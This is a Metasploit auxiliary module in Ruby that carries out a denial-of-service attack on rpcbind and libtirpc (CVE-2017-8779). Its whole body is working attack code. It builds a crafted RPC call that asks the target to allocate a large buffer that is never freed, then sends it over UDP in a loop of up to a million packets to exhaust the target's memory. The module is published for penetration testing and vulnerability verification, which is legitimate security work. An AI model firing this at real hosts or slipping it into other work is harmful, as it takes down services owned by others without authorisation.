##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Dos
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::UDPScanner

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'RPC DoS targeting *nix rpcbind/libtirpc',
      'Description' => %q{
        This module exploits a vulnerability in certain versions of
        rpcbind, LIBTIRPC, and NTIRPC, allowing an attacker to trigger
        large (and never freed) memory allocations for XDR strings on
        the target.
      },
      'Author'  =>
        [
          'guidovranken', # original code
          'Pearce Barry <pearce_barry[at]rapid7.com>' # Metasploit module
        ],
      'License' => MSF_LICENSE,
      'References' => [
        [ 'CVE', '2017-8779' ],
        [ 'BID', '98325' ],
        [ 'URL', 'http://openwall.com/lists/oss-security/2017/05/03/12' ]
      ],
      'Disclosure Date' => 'May 03 2017'))

    register_options([
      Opt::RPORT(111),
      OptInt.new('ALLOCSIZE', [true, 'Number of bytes to allocate', 1000000]),
      OptInt.new('COUNT', [false, "Number of intervals to loop", 1000000])
    ])
  end

  def scan_host(ip)
    pkt = [
      0,        # xid
      0,        # message type CALL
      2,        # RPC version 2
      100000,   # Program
      4,        # Program version
      9,        # Procedure
      0,        # Credentials AUTH_NULL
      0,        # Credentials length 0
      0,        # Credentials AUTH_NULL
      0,        # Credentials length 0
      0,        # Program: 0
      0,        # Ver
      4,        # Proc
      4,        # Argument length
      datastore['ALLOCSIZE'] # Payload
    ].pack('N*')

    s = udp_socket(ip, datastore['RPORT'])
    count = 0
    while count < datastore['COUNT'] do
      begin
        s.send(pkt, 0)
      rescue ::Errno::ENOBUFS, ::Rex::ConnectionError, ::Errno::ECONNREFUSED
        vprint_error("Host #{ip} unreachable")
        break
      end
      count += 1
    end

    vprint_good("Completed #{count} loop(s) of allocating #{datastore['ALLOCSIZE']} bytes on host #{ip}:#{datastore['RPORT']}")
  end
end
